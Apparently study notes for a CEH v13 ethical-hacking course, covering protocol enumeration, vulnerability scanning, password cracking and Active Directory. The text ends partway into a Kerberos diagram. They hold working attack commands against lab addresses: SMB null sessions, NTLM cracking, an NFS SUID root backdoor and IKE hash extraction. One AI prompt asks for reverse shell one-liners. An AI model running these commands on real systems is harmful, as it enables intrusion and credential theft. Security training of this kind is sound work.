# 🛡️ CEH v13 Master Lecture Notes: Advanced Enumeration to Web Application Attacks

> **Course:** Certified Ethical Hacker (CEH v13) / Threat Hunting & SOC Engineering  
> **Session:** Master Class — Modules 04 through 14 Synthesis & Web Attacks Taxonomy  
> **Date:** 2026-10-27  
> **Navigation:** [🏠 CEH Dashboard](./README.md) | [⬅️ Module 03: Scanning Networks](./mod-03-scanning-networks.md) | [➡️ Modules 15–20 Master Class](./2026-10-31-ceh-advanced-domains-notes.md) | [Main Dashboard](../README.md)  
> **Associated Courseware:** CEH v13 Modules 04–13 PDFs & [Web Application Attacks Matrix](../References/CEH_REF/web_attacks.jpeg)

---

## 🧭 Executive Navigation Map

1. [The Unified Attack Continuum & Master Architectural Flow](#1-the-unified-attack-continuum--master-architectural-flow)
2. [Module 04: Advanced Protocol Enumeration](#2-module-04-advanced-protocol-enumeration)
   - [Core Concept & The Three Protocol Classifications](#core-concept--the-three-protocol-classifications)
   - [SMB (TCP 139/445) & Complete Attack Pipeline](#smb-tcp-139445--complete-attack-pipeline)
   - [NetBIOS (UDP 137/138, TCP 139) Suffixes](#netbios-udp-137138-tcp-139-suffixes)
   - [SNMP (UDP 161/162), MIB Trees & OID Architecture](#snmp-udp-161162-mib-trees--oid-architecture)
   - [LDAP (TCP 389/636) & Active Directory Trees](#ldap-tcp-389636--active-directory-trees)
   - [NTP (UDP 123) & Monlist Telemetry](#ntp-udp-123--monlist-telemetry)
   - [NFS (TCP/UDP 2049) & Root Squash Misconfigurations](#nfs-tcpudp-2049--root-squash-misconfigurations)
   - [SMTP (TCP 25/587) User Enumeration Commands](#smtp-tcp-25587-user-enumeration-commands)
   - [IPsec & VPN Probing (UDP 500/4500)](#ipsec--vpn-probing-udp-5004500)
   - [OWASP Amass Architecture & Autonomous Enumeration](#owasp-amass-architecture--autonomous-enumeration)
   - [AI & ShellGPT (`sgpt`) Automated Prompting Workflows](#ai--shellgpt-sgpt-automated-prompting-workflows)
3. [Module 05: Vulnerability Analysis & Enterprise Assessment](#3-module-05-vulnerability-analysis--enterprise-assessment)
   - [Vulnerability Assessment Lifecycle & Classification (CVSS v3.1 vs v4.0)](#vulnerability-assessment-lifecycle--classification-cvss-v31-vs-v40)
   - [Enterprise Scanners: Qualys VMDR Architecture vs Nessus](#enterprise-scanners-qualys-vmdr-architecture-vs-nessus)
4. [Module 06: System Hacking, Active Directory & Kerberos Exploitation](#4-module-06-system-hacking-active-directory--kerberos-exploitation)
   - [Password Cracking Mechanics: John the Ripper, Hashcat & Python (`pycrack`)](#password-cracking-mechanics-john-the-ripper-hashcat--python-pycrack)
   - [Active Directory Core Architecture](#active-directory-core-architecture)
   - [Deep Kerberos Protocol Flow (AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP)](#deep-kerberos-protocol-flow-as-reqrep-tgs-reqrep-ap-reqrep)
   - [AS-REP Roasting vs Kerberoasting Mechanics](#as-rep-roasting-vs-kerberoasting-mechanics)
   - [Golden Ticket vs Silver Ticket Deep Architectural Comparison](#golden-ticket-vs-silver-ticket-deep-architectural-comparison)
   - [Keyloggers & Spyware Mechanisms](#keyloggers--spyware-mechanisms)
   - [Buffer Overflow Mechanics: Stack Layout, Registers & EIP Overwrite](#buffer-overflow-mechanics-stack-layout-registers--eip-overwrite)
   - [Privilege Escalation vs Session Hijacking Distinction](#privilege-escalation-vs-session-hijacking-distinction)
   - [CI/CD Pipeline Security & Poisoned Pipeline Execution (PPE)](#cicd-pipeline-security--poisoned-pipeline-execution-ppe)
   - [Offensive & Defensive Bash Scripting Engineering](#offensive--defensive-bash-scripting-engineering)
5. [Module 07: Malware Threats, APT Lifecycle & SOC YARA Engineering](#5-module-07-malware-threats-apt-lifecycle--soc-yara-engineering)
   - [Malware Taxonomy & Advanced Persistent Threat (APT) Tradecraft](#malware-taxonomy--advanced-persistent-threat-apt-tradecraft)
   - [SOC Engineering with YARA: Structure, Byte Patterns & Production Rules](#soc-engineering-with-yara-structure-byte-patterns--production-rules)
6. [Module 08: Sniffing, Snooping, Spoofing & Network Attacks](#6-module-08-sniffing-snooping-spoofing--network-attacks)
   - [Snooping vs Sniffing vs Spoofing vs Poisoning](#snooping-vs-sniffing-vs-spoofing-vs-poisoning)
   - [Traffic Analysis: Wireshark & Headless Tshark Workflows](#traffic-analysis-wireshark--headless-tshark-workflows)
   - [Bettercap MITM Orchestration](#bettercap-mitm-orchestration)
   - [ARP Poisoning, MAC Flooding, DHCP Starvation & Layer 2 Defenses](#arp-poisoning-mac-flooding-dhcp-starvation--layer-2-defenses)
7. [Module 09: Social Engineering, Identity Theft & Psychological Manipulation](#7-module-09-social-engineering-identity-theft--psychological-manipulation)
   - [Human Exploitation Vectors & Cialdini's Psychological Triggers](#human-exploitation-vectors--cialdinis-psychological-triggers)
   - [Identity Theft, Manipulation & Synthetic Identities](#identity-theft-manipulation--synthetic-identities)
8. [Module 10: Denial-of-Service (DoS), DDoS & Botnets](#8-module-10-denial-of-service-dos-ddos--botnets)
   - [DoS vs DDoS Mechanics & Botnet C2 Topologies](#dos-vs-ddos-mechanics--botnet-c2-topologies)
   - [Volumetric, Protocol/State & Layer 7 Attacks](#volumetric-protocolstate--layer-7-attacks)
9. [Module 11: Session Hijacking & Web Proxies](#9-module-11-session-hijacking--web-proxies)
   - [Layer 4 (Transport) vs Layer 7 (Application) Session Hijacking](#layer-4-transport-vs-layer-7-application-session-hijacking)
   - [Proxy Tooling: Caido vs Burp Suite Comparative Breakdown](#proxy-tooling-caido-vs-burp-suite-comparative-breakdown)
10. [Module 12: Evading IDS, Firewalls & Honeypots](#10-module-12-evading-ids-firewalls--honeypots)
    - [Network Segmentation, Security Zones & DMZ Architecture](#network-segmentation-security-zones--dmz-architecture)
    - [Snort IDS/IPS Architecture & Detection Engineering](#snort-idsips-architecture--detection-engineering)
    - [Firewall Taxonomy & Gateway Attack Techniques](#firewall-taxonomy--gateway-attack-techniques)
    - [Palo Alto Next-Gen Firewall (NGFW): App-ID, User-ID, Content-ID & Evasion](#palo-alto-next-gen-firewall-ngfw-app-id-user-id-content-id--evasion)
    - [Anonymous Proxies & Onion Routing](#anonymous-proxies--onion-routing)
11. [Modules 13 & 14: Web Servers, Applications & OWASP Top 10](#11-modules-13--14-web-servers-applications--owasp-top-10)
    - [Web Server Architectures & Flaws](#web-server-architectures--flaws)
    - [AI Prompting for Penetration Testing](#ai-prompting-for-penetration-testing)
    - [OWASP Top 10: 2017 vs 2021 Structural Evolution](#owasp-top-10-2017-vs-2021-structural-evolution)
12. [The Complete Catalog of 35 Web Application Attacks](#12-the-complete-catalog-of-35-web-application-attacks)
13. [Big Picture: How It All Works Together](#13-big-picture-how-it-all-works-together)
14. [Real-Time Technical Scenario: Red Team Assessment vs. SOC Response](#14-real-time-technical-scenario-red-team-assessment-vs-soc-response)
15. [Failed Attempts & Engineering Diagnostics](#15-failed-attempts--engineering-diagnostics)
16. [My Understanding Check](#16-my-understanding-check)

---

## 1. The Unified Attack Continuum & Master Architectural Flow

In ethical hacking and enterprise defense, security testing follows a deterministic, sequential progression known as the **Unified Attack Continuum**. While previous modules established perimeter visibility (Reconnaissance) and live socket states (Scanning), this session spans the transition from initial protocol interrogation to full enterprise domain compromise and web application exploitation.

```text
+----------------------------------------------------------------------------------------------------+
|                                    THE UNIFIED ATTACK CONTINUUM                                    |
+----------------------------------------------------------------------------------------------------+

  [MODULE 04: ENUMERATION]                  [MODULE 05: VULN ANALYSIS]        [MODULE 06: SYSTEM HACKING]
+--------------------------+               +--------------------------+     +---------------------------+
| Interrogate Live Sockets |               | Scan & Score Weaknesses  |     | Crack Password Hashes     |
| • SMB Shares (139/445)   | ------------> | • Qualys VMDR Engine     | --> | • John / Hashcat Cracking |
| • SNMP Trees (161/162)   |               | • CVSS v3.1 / v4.0 Base  |     | • Buffer Overflow / PrivEsc|
| • LDAP / Active Directory|               | • Prioritize Remote CVEs |     | • AD Kerberos (Roasting)  |
+--------------------------+               +--------------------------+     +---------------------------+
             │                                                                            │
             ▼                                                                            ▼
  [MODULE 08: SNIFFING]                     [MODULE 07: MALWARE / SOC]        [MODULE 11: HIJACKING]
+--------------------------+               +--------------------------+     +---------------------------+
| Traffic & Protocol Abuse |               | Persistent Implants & YARA|    | Intercept & Usurp Sessions|
| • ARP / DNS Poisoning    | <-----------> | • Custom C2 Implants     | --> | • Caido / Burp Proxying   |
| • Wireshark / Bettercap  |               | • APT Living-off-the-Land|     | • L4 TCP vs L7 Cookie Steal|
+--------------------------+               | • SOC YARA Detection     |     +---------------------------+
             │                             +--------------------------+                   │
             ▼                                                                            ▼
  [MODULE 12: EVASION]                      [MODULE 10: DOS / BOTNET]         [MODULE 13 & 14: WEB]
+--------------------------+               +--------------------------+     +---------------------------+
| Bypass Perimeter Filters |               | Resource Exhaustion      |     | Exploit Web Stack & Apps  |
| • Snort Rule Evasion     | ------------> | • SYN Floods / Slowloris | --> | • OWASP Top 10 (2021)     |
| • Palo Alto NGFW Bypass  |               | • Botnet C2 Orchestration|     | • 35 Web Attack Vectors   |
| • Network Segmentation   |               +--------------------------+     +---------------------------+
+--------------------------+
```

---

## 2. Module 04: Advanced Protocol Enumeration

### Core Concept & The Three Protocol Classifications
**Enumeration** is the process of establishing active, bidirectional application-layer connections to discovered open sockets to extract structured metadata: **valid usernames, group memberships, network shares, machine hostnames, service versions, routing tables, and security configurations**.

In cybersecurity architecture, protocols interrogated during enumeration fall into **three fundamental operational classifications**:

| Protocol Classification | Core Characteristics | Transport Layer | Primary Examples | Pentesting Interrogation Focus |
| :--- | :--- | :--- | :--- | :--- |
| **1. Connection-Oriented Protocols** | Stateful, deterministic 3-way handshakes, sequence tracking, guaranteed packet delivery, flow control via windowing. | TCP (Layer 4) | SMB (445), LDAP (389), SMTP (25), HTTP (80/443) | Session establishment, user harvesting via command transactions, null-session binding. |
| **2. Connectionless Protocols** | Stateless, minimal header overhead, no handshake, best-effort delivery, vulnerable to IP spoofing and amplification. | UDP (Layer 4) | SNMP (161), NTP (123), DNS (53), TFTP (69) | Community string brute forcing, command reflection, cache interrogation. |
| **3. Encapsulated / Hybrid Protocols** | Tunneling payloads within another transport, cryptographic wrapping, complex multi-phase state machines. | TCP/UDP Layer 4 / IP Layer 3 | IPsec (ESP/AH, UDP 500/4500), RPC over SMB, LDAPS (636) | Security association probing, cryptographic suite downgrade, pre-shared key (PSK) hash harvesting. |

---

### SMB (TCP 139/445) & Complete Attack Pipeline
The **Server Message Block (SMB)** protocol provides shared access to files, printers, and serial ports between network nodes.

```text
+----------------------------------------------------------------------------------------------------+
|                               THE SMB-TO-CREDENTIAL EXPLOITATION PIPELINE                          |
+----------------------------------------------------------------------------------------------------+

 [STEP 1: RECON]                [STEP 2: ENUMERATE]            [STEP 3: EXTRACT]      [STEP 4: CRACK & PWN]
+---------------+              +--------------------+         +-----------------+    +----------------------+
| Target IP:    |              | smbclient -L       |         | Download        |    | john --wordlist=     |
| 10.10.10.50   | -----------> | //10.10.10.50 -N   | ------> | backup_accounts | -> | rockyou.txt hashes   |
| Ports 139/445 |              | (Null Session      |         | .xlsx / sam.bak |    | Plaintext: "P@ss123" |
+---------------+              |  Access granted)   |         +-----------------+    +----------------------+
                               +--------------------+                                          │
                                          │                                                    ▼
                                          │ Access "Confidential" Share              +----------------------+
                                          └────────────────────────────────────────> | Login to Web Portal  |
                                                                                     | or SSH Shell as Admin|
                                                                                     +----------------------+
```

#### SMB Attack Chain Walkthrough
1. **Null Session & Anonymous Probing:**
   Interrogate the SMB server without supplying credentials (using username `""` and password `""`):
   ```bash
   # List public and administrative shares anonymously
   smbclient -L //10.10.10.50 -N
   
   # Comprehensive SMB auditing with enum4linux-ng
   enum4linux-ng -A 10.10.10.50
   
   # Map accessible shares and permission masks using smbmap
   smbmap -H 10.10.10.50 -u "" -p ""
   ```

2. **File Discovery & Share Access:**
   Connect to an open share (e.g., `backups` or `finance`) and retrieve stored files:
   ```bash
   smbclient //10.10.10.50/backups -N
   smb: \> ls
   smb: \> get credentials_dump.txt
   smb: \> exit
   ```

3. **Credential Extraction:**
   Inside `credentials_dump.txt`, we discover an extracted NTLM hash:
   ```text
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   web_svc:1002:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
   ```

4. **Password Cracking with John the Ripper:**
   Feed the hash into `john` using the `rockyou.txt` dictionary:
   ```bash
   # Isolate NTLM hash (32-character hex)
   echo "8846f7eaee8fb117ad06bdd830b7586c" > ntlm_hash.txt
   
   # Execute dictionary attack specifying the NT format
   john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash.txt
   
   # Display cracked credentials
   john --format=NT --show ntlm_hash.txt
   # Output: ?:Password2026!
   ```

5. **Site Authentication & Compromise:**
   Take the recovered plaintext password (`Password2026!`) and authenticate against the corporate management portal at `https://10.10.10.50/admin` or execute lateral movement via WinRM (`evil-winrm -i 10.10.10.50 -u web_svc -p 'Password2026!'`).

---

### NetBIOS (UDP 137/138, TCP 139) Suffixes
**NetBIOS (Network Basic Input/Output System)** enables legacy applications to communicate across local area networks. Each registered NetBIOS name consists of 16 characters: 15 for the machine name and the **16th byte (suffix)** indicating the service type.

```text
NetBIOS Name Format: [  HOSTNAME (15 chars)  ][Suffix (1 byte)]
Example:             CORP-DC-01        <20>
```

| NetBIOS Suffix | Record Type | Functional Description | Pentesting Significance |
| :---: | :---: | :--- | :--- |
| `<00>` | Unique | Workstation / Client Service Name | Confirms machine hostname and active domain client. |
| `<00>` | Group | Domain / Workgroup Name | Identifies the Active Directory domain or workgroup membership. |
| `<03>` | Unique | Windows Messenger Service | Used by older messaging services; indicates legacy OS presence. |
| `<1B>` | Unique | Domain Master Browser | Identifies the primary Domain Controller responsible for WAN browsing. |
| `<1D>` | Unique | Master Browser | Identifies the local subnet's Master Browser server. |
| `<20>` | Unique | File Server Service (Server) | **Crucial:** Indicates SMB/File Sharing is active and running. |

**Interrogation Command:**
```bash
nbtscan -r -v 10.10.10.0/24
```

---

### SNMP (UDP 161/162), MIB Trees & OID Architecture
The **Simple Network Management Protocol (SNMP)** monitors network devices (switches, routers, firewalls, Linux/Windows servers). 

```text
+----------------------------------------------------------------------------------------------------+
|                                      SNMP OID TREE STRUCTURE                                       |
+----------------------------------------------------------------------------------------------------+
                                             iso (1)
                                                │
                                            org (3)
                                                │
                                            dod (6)
                                                │
                                         internet (1)
                                                │
                 ┌──────────────────────────────┴──────────────────────────────┐
                 │                                                             │
            mgmt (2)                                                      private (4)
                 │                                                             │
             mib-2 (1)                                                   enterprises (1)
                 │                                                             │
   ┌─────────────┼─────────────┬─────────────┐                                 │
   │             │             │             │                       Vendor-Specific Trees
system (1)  interfaces (2)   ip (4)      host (25)
   │             │             │             │
 sysDescr    ifDescr       ipRouteTable   hrSWRun (Running Processes: .1.3.6.1.2.1.25.4.2.1.2)
 (.1.1)      (.2.1.2)      (.4.21)        hrSWInstalledName (.1.3.6.1.2.1.25.6.3.1.2)
```

#### SNMP Security Versions
- **SNMPv1 & SNMPv2c:** Completely unencrypted. Authenticate using cleartext **Community Strings** (acting as shared passwords). Default read-only string: `public`; default read-write string: `private`.
- **SNMPv3:** Introduces the **User-based Security Model (USM)** supporting cryptographic authentication (HMAC-SHA/MD5) and confidentiality (AES/DES encryption).

#### Interrogation Commands
```bash
# Brute force SNMP community strings using onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.50

# Walk the entire MIB tree using snmpwalk
snmpwalk -v2c -c public 10.10.10.50

# Enumerate running processes and installed software
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -v2c -c public 10.10.10.50 1.3.6.1.2.1.25.6.3.1.2

# Comprehensive automated report with snmp-check
snmp-check -t 10.10.10.50 -c public
```

---

### LDAP (TCP 389/636) & Active Directory Trees
The **Lightweight Directory Access Protocol (LDAP)** provides an organized, hierarchical directory service across an enterprise. In Windows environments, LDAP is the primary engine behind **Active Directory Domain Services (AD DS)**.

```text
Hierarchical Base DN: dc=corp,dc=local
  ├── ou=Domain Controllers
  │    └── cn=DC-01
  ├── ou=Finance
  │    └── cn=Alice Smith (sAMAccountName: asmith)
  └── ou=Engineering
       └── cn=Bob Jones (sAMAccountName: bjones)
```

#### Anonymous LDAP Interrogation
```bash
# Query the Root Domain Management Information Base anonymously
ldapsearch -x -H ldap://10.10.10.50 -s base namingcontexts

# Extract all AD user accounts and email addresses
ldapsearch -x -H ldap://10.10.10.50 -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName mail description

# Automated AD mapping using windapsearch
python3 windapsearch.py -d corp.local --dc-ip 10.10.10.50 -U
```

---

### NTP (UDP 123) & Monlist Telemetry
The **Network Time Protocol (NTP)** synchronizes system clocks across networks. In legacy NTP daemons (version 4.2.7 and earlier), the **`monlist`** command allows anyone to request a list of the last 600 IP addresses that communicated with the time server.

```bash
# Enumerate server state and peers
ntpq -p 10.10.10.50

# Execute monlist query to harvest client IP addresses
ntpdc -c monlist 10.10.10.50
```
> [!WARNING]
> The `monlist` command is also weaponized in **NTP Amplification DDoS attacks**, yielding an amplification factor exceeding **1000x** (a 48-byte request generating multiple 480-byte responses).

---

### NFS (TCP/UDP 2049) & Root Squash Misconfigurations
The **Network File System (NFS)** enables Unix/Linux systems to mount remote directories over a network.

```bash
# Query RPC Portmapper (Port 111) to discover active NFS services
rpcinfo -p 10.10.10.50

# View exported network file systems
showmount -e 10.10.10.50
# Output: /var/shared  *(rw,sync,no_root_squash)
```

#### Root Squash Privilege Escalation Mechanics
- **`root_squash` (Secure Default):** When a remote user connects as UID 0 (`root`), the server maps ("squashes") their privileges down to the unprivileged account `nobody` (UID 65534).
- **`no_root_squash` (Vulnerable Misconfiguration):** Remote root requests retain UID 0 privileges. An attacker can mount the share locally, create a binary owned by `root`, set the SUID bit (`chmod +s`), and execute it on the target server for an immediate root shell:
  ```bash
  # Mount remote export
  mkdir /mnt/nfs_target
  mount -t nfs 10.10.10.50:/var/shared /mnt/nfs_target
  
  # Create SUID root backdoor
  cp /bin/bash /mnt/nfs_target/rootbash
  chmod +xs /mnt/nfs_target/rootbash
  ```

---

### SMTP (TCP 25/587) User Enumeration Commands
The **Simple Mail Transfer Protocol (SMTP)** is used for email delivery. RFC 821 defines commands designed to assist mail delivery agents, which can be abused to confirm the existence of local system users:

| SMTP Command | RFC Definition | Pentesting Interrogation Mechanics |
| :--- | :--- | :--- |
| **`VRFY`** | Verify | Confirms if a specified username or mailbox exists on the server. Response `250` confirms existence; `550` indicates invalid user. |
| **`EXPN`** | Expand | Expands a mailing list alias to reveal all underlying member email addresses. |
| **`RCPT TO`** | Recipient To | Specifies the delivery recipient during message transactions. Server responses reveal valid mailbox addresses before payload submission. |

```text
[Attacker] ──> VRFY admin ─────────────> [SMTP Server]
[Attacker] <── 250 2.1.5 admin@corp.local [SMTP Server] (User Valid!)
[Attacker] ──> VRFY nonexistent ────────> [SMTP Server]
[Attacker] <── 550 5.1.1 User unknown ─── [SMTP Server] (User Invalid!)
```

```bash
# Automated SMTP user enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.10.50
```

---

### IPsec & VPN Probing (UDP 500/4500)
**IPsec (Internet Protocol Security)** establishes encrypted virtual private networks. The **Internet Key Exchange (IKE)** protocol negotiates security associations:
- **Phase 1 Main Mode:** Six packets exchanged. Identity is protected via encryption.
- **Phase 1 Aggressive Mode:** Three packets exchanged. The server sends its hashed Pre-Shared Key (PSK) authentication payload in cleartext.

```bash
# Probe for IKE daemons using ike-scan
ike-scan 10.10.10.50

# Exploit Aggressive Mode to extract PSK hash
ike-scan -A -M -B 10M -v --id=corporate_group 10.10.10.50 -P ike_hash.txt

# Crack PSK hash offline using Hashcat (Mode 5400)
hashcat -m 5400 -a 0 ike_hash.txt /usr/share/wordlists/rockyou.txt
```

---

### OWASP Amass Architecture & Autonomous Enumeration
*(Clarification: Correcting the user prompt's "Amaze" to the industry-standard tool **OWASP Amass**).*

**OWASP Amass** is an in-depth attack surface mapping and external asset discovery framework. It compiles data from over 85 public data sources, active DNS resolution engines, and certificate transparency logs into an internal graph database.

```text
+----------------------------------------------------------------------------------------------------+
|                                    OWASP AMASS GRAPH ENGINE                                        |
+----------------------------------------------------------------------------------------------------+
 [OSINT Sources]           [Active DNS Engine]          [Certificate Logs]       [Routing / BGP]
 (AlienVault, Shodan)    (Brute-force / Alterations)    (crt.sh, CertCentral)    (Shadowserver, RADb)
         │                         │                            │                        │
         └─────────────────────────┼────────────────────────────┴────────────────────────┘
                                   ▼
                   +-------------------------------+
                   |      AMASS CORE ENGINE        |
                   |   (Event-Driven Architecture) |
                   +-------------------------------+
                                   │
                                   ▼
                   +-------------------------------+
                   |     INTERNAL GRAPH DB         |
                   | (ASN <-> Netblock <-> Domain  |
                   |  <-> FQDN <-> IP <-> Service) |
                   +-------------------------------+
```

```bash
# Passive external enumeration (Stealth / Zero packet transmission to target)
amass enum -passive -d corp.local

# Active comprehensive network graph mapping with DNS resolution
amass enum -active -d corp.local -brute -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

### AI & ShellGPT (`sgpt`) Automated Prompting Workflows
Modern penetration testers and SOC engineers leverage command-line AI models like **ShellGPT (`sgpt`)** to parse dense protocol enumeration outputs and automate payload generation.

#### Practical `sgpt` Security Prompts
1. **Automated Nmap/SMB Parser:**
   ```bash
   nmap -sV -p 139,445 --script smb-enum-shares,smb-enum-users 10.10.10.50 | sgpt "Parse this SMB scan output. Extract all valid usernames, readable share paths, and flag any critical misconfigurations in a clean markdown table."
   ```
2. **Reverse Shell Generator:**
   ```bash
   sgpt --code "Generate 5 different reverse shell one-liners for target IP 10.10.14.5 on port 4444 using bash, python3, php, socat, and perl without using /bin/sh."
   ```
3. **Log Triage Prompt:**
   ```bash
   tail -n 100 /var/log/auth.log | sgpt "Analyze these authentication logs. Identify potential brute-force patterns, anomalous source IP addresses, and calculate failure-to-success ratios."
   ```

---

## 3. Module 05: Vulnerability Analysis & Enterprise Assessment

### Vulnerability Assessment Lifecycle & Classification (CVSS v3.1 vs v4.0)
Vulnerability analysis is the structured identification, quantification, and prioritization of vulnerabilities across an organization's hardware, software, and firmware assets.

```text
+-----------------------------------------------------------------------------------+
|                        VULNERABILITY ASSESSMENT LIFECYCLE                         |
+-----------------------------------------------------------------------------------+
|  [Phase 1] Pre-Assessment: Scope Definition, Asset Discovery & Tool Configuration |
|       │                                                                           |
|       ▼                                                                           |
|  [Phase 2] Assessment: Vulnerability Scanning (Credentialed vs Non-Credentialed)  |
|       │                                                                           |
|       ▼                                                                           |
|  [Phase 3] Post-Assessment: Verification, Elimination of False Positives, Scoring  |
|       │                                                                           |
|       ▼                                                                           |
|  [Phase 4] Remediation & Reporting: Patch Management, Compensating Controls, SLA  |
+-----------------------------------------------------------------------------------+
```

#### CVSS Evolution: CVSS v3.1 vs CVSS v4.0
The Common Vulnerability Scoring System (CVSS) provides an open numerical standard to rate severity:

| Dimension / Metric | CVSS v3.1 | CVSS v4.0 (Latest Standard) |
| :--- | :--- | :--- |
| **Base Metrics Focus** | Exploitability & Impact (Confidentiality, Integrity, Availability). | Exploitability, Impact, and **Attack Requirements (AT)** separated from Complexity. |
| **Attack Complexity (AC)** | Combined technical complexity and deployment preconditions. | **AC** strictly measures defensive mechanisms (e.g., ASLR/DEP); **AT** measures preconditions. |
| **User Interaction (UI)** | `None (N)` or `Required (R)`. | `None (N)`, `Passive (P)` (victim views content), `Active (A)` (victim executes file). |
| **Scope Metric (S)** | Modified impact if host compromised downstream. | **Removed.** Replaced with explicit **Subsequent System (S)** Impact metrics (`SC/SI/SA`). |
| **Nomenclature** | CVSS-B (Base), CVSS-BT (Temporal), CVSS-BTE (Environmental). | **CVSS-B** (Base), **CVSS-BT** (Threat), **CVSS-BE** (Environmental), **CVSS-BTE** (Combined). |
| **Supplemental Metrics** | None. | Adds **Automatable (AU)**, **Recovery (R)**, **Value Density (V)**, and **Vulnerability Response Effort (RE)**. |

---

### Enterprise Scanners: Qualys VMDR Architecture vs Nessus
In enterprise SOC and vulnerability management teams, **Qualys VMDR (Vulnerability Management, Detection, and Response)** dominates large cloud and hybrid environments, while **Tenable Nessus** is the primary choice for targeted consultant assessments.

```text
+----------------------------------------------------------------------------------------------------+
|                                      QUALYS VMDR CLOUD ARCHITECTURE                                |
+----------------------------------------------------------------------------------------------------+

  [Endpoints & Servers]              [Internal Network]                 [Cloud Platforms]
+-----------------------+        +-----------------------+        +---------------------------+
| Qualys Cloud Agent    |        | Qualys Virtual Scanner|        | Cloud Connector APIs      |
| (Lightweight OS agent)|        | Appliance (Private LAN|        | (AWS, Azure, GCP APIs)    |
+-----------------------+        +-----------------------+        +---------------------------+
            │                                │                                      │
            └────────────────────────────────┼──────────────────────────────────────┘
                                             ▼ (HTTPS / TLS 1.3 Outbound Port 443)
                         +---------------------------------------+
                         |      QUALYS ENTERPRISE CLOUD PLATFORM  |
                         |  • KnowledgeBase (QID Signatures)     |
                         |  • Continuous Asset Risk Scoring (TruRisk)
                         |  • Automated Patch Orchestration      |
                         +---------------------------------------+
```

| Evaluation Vector | Qualys VMDR | Tenable Nessus Professional |
| :--- | :--- | :--- |
| **Deployment Model** | Cloud-native multi-tenant SaaS with local virtual appliances & agents. | Standalone software installed on auditor workstation/server. |
| **Agent vs Network Scan** | **Cloud Agent-first:** Continuous metadata upload without network sweeps. | **Network-first:** Active TCP/UDP network sweeps and credentialed SSH/SMB. |
| **Asset Scalability** | Millions of endpoints across multi-cloud global infrastructure. | Ideal for subnets of 100 to 5,000 devices per scanner instance. |
| **Vulnerability ID** | **QID (Qualys ID):** Comprehensive signature index. | **Plugin ID:** Tenable proprietary NASL scripting engine. |
| **Remediation Integration**| Native automated patch deployment workflows built into agent. | Identification and reporting; patching handled via external tools. |

---

## 4. Module 06: System Hacking, Active Directory & Kerberos Exploitation

### Password Cracking Mechanics: John the Ripper, Hashcat & Python (`pycrack`)
Cryptographic password cracking relies on verifying whether candidate passwords hashed through a one-way mathematical function match a compromised target digest.

```text
+-------------------+        +--------------------+        +--------------------+
| Candidate Guess:  |  --->  | Hashing Algorithm  |  --->  | Candidate Hash:    |
| "Password123!"    |        | (e.g., NTLM, MD5)  |        | 8846f7eaee...      |
+-------------------+        +--------------------+        +--------------------+
                                                                     │
                                                                     ▼ Compare
                                                           +--------------------+
                                                           | Target Stolen Hash:|
                                                           | 8846f7eaee...      |
                                                           +--------------------+
                                                                     │ Match?
                                                              YES ───┴───> CRACKED!
```

#### Hashcat vs John the Ripper Syntax
```bash
# Hashcat GPU Cracking (Mode 1000 = NTLM, Mode 0 = MD5, Mode 1800 = sha512crypt)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper CPU Cracking with rule-based mutations
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo target_hashes.txt
```

#### Custom Python Hash Cracker (`pycrack.py`)
To understand how password crackers execute candidate comparisons under the hood:
```python
#!/usr/bin/env python3
import hashlib
import sys

def pycrack(target_hash, wordlist_path, hash_type="ntlm"):
    print(f"[*] Starting pycrack against: {target_hash} ({hash_type})")
    with open(wordlist_path, "r", encoding="latin-1") as f:
        for line in f:
            word = line.strip()
            if hash_type == "ntlm":
                # NTLM: MD4 of UTF-16LE encoded plaintext
                digest = hashlib.new('md4', word.encode('utf-16le')).hexdigest()
            elif hash_type == "md5":
                digest = hashlib.md5(word.encode('utf-8')).hexdigest()
            elif hash_type == "sha256":
                digest = hashlib.sha256(word.encode('utf-8')).hexdigest()
            
            if digest.lower() == target_hash.lower():
                print(f"[+] PASSWORD CRACKED: {word}")
                return word
    print("[-] Password not found in wordlist.")
    return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 pycrack.py <hash> <wordlist> [hash_type]")
        sys.exit(1)
    htype = sys.argv[3] if len(sys.argv) > 3 else "ntlm"
    pycrack(sys.argv[1], sys.argv[2], htype)
```

---

### Active Directory Core Architecture
**Active Directory (AD)** is Microsoft's centralized directory service managing enterprise identity, authentication, and authorization.

```text
+-----------------------------------------------------------------------------------+
|                           ACTIVE DIRECTORY FOREST HIERARCHY                       |
+-----------------------------------------------------------------------------------+
|                                  FOREST ROOT DOMAIN                               |
|                                     (corp.local)                                  |
|                                          │                                        |
|                 ┌────────────────────────┴────────────────────────┐               |
|                 ▼                                                 ▼               |
|            CHILD DOMAIN                                      CHILD DOMAIN         |
|         (us.corp.local)                                   (eu.corp.local)         |
|                 │                                                 │               |
|       ┌─────────┴─────────┐                             ┌─────────┴─────────┐     |
|       ▼                   ▼                             ▼                   ▼     |
|  [Domain Controller]  [Workstations]               [Domain Controller]  [Servers] |
|   (KDC, NTDS.dit)     (OU: Employees)               (KDC, NTDS.dit)     (OU: Web) |
+-----------------------------------------------------------------------------------+
```
- **Domain Controller (DC):** The trusted server that authenticates users, processes Kerberos tickets, and stores the directory database (`NTDS.dit`).
- **Key Distribution Center (KDC):** The core authentication service residing on every DC, composed of two sub-services:
  1. **Authentication Service (AS):** Issues Ticket Granting Tickets (TGTs).
  2. **Ticket Granting Service (TGS):** Issues Service Tickets (STs).

---

### Deep Kerberos Protocol Flow (AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP)
The Kerberos protocol operates over **TCP/UDP port 88** using symmetric cryptography to eliminate the transmission of cleartext passwords over the wire.

```text
+----------------------------------------------------------------------------------------------------+
